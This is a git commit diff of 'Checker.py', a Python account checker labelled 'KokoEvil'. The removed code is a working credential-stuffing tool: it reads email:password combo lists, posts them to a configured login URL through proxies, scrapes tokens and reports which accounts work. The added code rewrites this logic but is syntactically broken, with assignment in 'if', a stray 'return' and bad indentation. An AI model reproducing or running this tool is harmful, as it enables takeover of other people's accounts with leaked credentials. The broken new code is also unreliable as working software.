582ff54a137e8f2f36f8edefbae34b4d33f9c422
KokoD3veloper <63654629+KokoD3veloper@users.noreply.github.com>
2020-12-31 16:40:02 +0300

    Update Checker.py

--- Checker.py
+++ Checker.py
@@ -1,3 +1,4 @@
+# KokoEvil
 import requests 
 import json
 print("""
@@ -5,12 +6,17 @@ print("""
 All In One By KokoD3veloper
 Thanks all friends
 https://github.com/KokoD3veloper
- __  ___   ______    __  ___   ______    __  .__   __.   ______   .__   __.  _______ 
-|  |/  /  /  __  \  |  |/  /  /  __  \  |  | |  \ |  |  /  __  \  |  \ |  | |   ____|
-|  '  /  |  |  |  | |  '  /  |  |  |  | |  | |   \|  | |  |  |  | |   \|  | |  |__   
-|    <   |  |  |  | |    <   |  |  |  | |  | |  . `  | |  |  |  | |  . `  | |   __|  
-|  .  \  |  `--'  | |  .  \  |  `--'  | |  | |  |\   | |  `--'  | |  |\   | |  |____ 
-|__|\__\  \______/  |__|\__\  \______/  |__| |__| \__|  \______/  |__| \__| |_______|
+
+
+ __  ___   ______    __  ___   ______    ___________    ____  __   __      
+|  |/  /  /  __  \  |  |/  /  /  __  \  |   ____\   \  /   / |  | |  |     
+|  '  /  |  |  |  | |  '  /  |  |  |  | |  |__   \   \/   /  |  | |  |     
+|    <   |  |  |  | |    <   |  |  |  | |   __|   \      /   |  | |  |     
+|  .  \  |  `--'  | |  .  \  |  `--'  | |  |____   \    /    |  | |  `----.
+|__|\__\  \______/  |__|\__\  \______/  |_______|   \__/     |__| |_______|
+                                                                           
+
+
                                                                                      """)
 def find_between(s, first, last):
     try:
@@ -21,53 +27,29 @@ def find_between(s, first, last):
         return ""
 config = input("Config Name: (With .txt ) ")
 proxy = input("Proxy Yes / No : ")
-f = open("configs/" + config, encoding='utf8')
-mydata = f.read()
-koko = mydata.split(" --")
-print(koko[0]) 
-postdata = koko[1]
-data2 = koko[2]
-url = koko[0]
-successkey = koko[3]
-failkey = koko[4]
-token = koko[5]
-a = open("mailcombo.txt", "r").readlines()
-file = [s.rstrip()for s in a]
-for lines in file:
-    p = requests.get("http://pubproxy.com/api/proxy?limit=1&format=txt&type=https")
-    proxies = {
-    "http": "89.187.177.92:80"
-        }
-    combo = lines.split(":")
-    email = combo[0]
-    sifre = combo[1]
-    myobj = {
-    postdata : email,
-    data2 : sifre
-    }
-    if token == "Yes" or token == "Yes":
-        tokenurl = koko[6]
-        tokendata = koko[7]
-        tokendata2 = koko[8]
-        pastetokendata = koko[9]
-        geturl = requests.get(tokenurl)
-        token213 = find_between(geturl.text, tokendata, tokendata2)
-        print("Token = Yes")
-        myobj = {
-        pastetokendata : token213,
-        postdata : email,
-        data2 : sifre
-        }
-    else:
-        print("Token = No")
-    if proxy == "Yes" or proxy == "yes":
-        print(failkey)
-        x = requests.post(url, data = myobj, proxies= proxies)
-    else:
-        x = requests.post(url, data = myobj)
-    if successkey in x.text:
-        print("Work Account ----------> " + email + ":" + sifre)
-    elif failkey in x.text:
-        print("Not Work Account ------>" + email + ":" + sifre)
-    else:
-        print ("Error Account -------->"  + email + ":" + sifre + x.text)
+if proxy = "Yes":
+ proxyre = "True"
+ return proxyre
+f = open("configs/" + config, encoding='utf8').readlines()
+combolist = open("mailcombo.txt", "r").readlines()
+ for lines in combolist:
+  proxy = requests.get("http://pubproxy.com/api/proxy?limit=1&format=txt&type=https")
+  proxies = {
+      "https": proxy
+
+  }
+  for lines in file:
+    if "Site = " in f:
+     link = lines.split("Site = ")[0]
+    if proxy = "True":
+     tokene = requests.post(link, proxies=proxies, data=data)
+     print("Success Block ---> POST")
+    if "SKEYCHECK" in f:
+      SuccessKey = lines.split("SKEYCHECK = ")[0]
+      if SuccessKey in tokene:
+        print("Success Account")
+
+    if "FKEYCHECK" in f:
+      FailKey = lines.split("FKEYCHECK = ")[0]
+      if FailKey in tokene:
+        print("Bad Account")
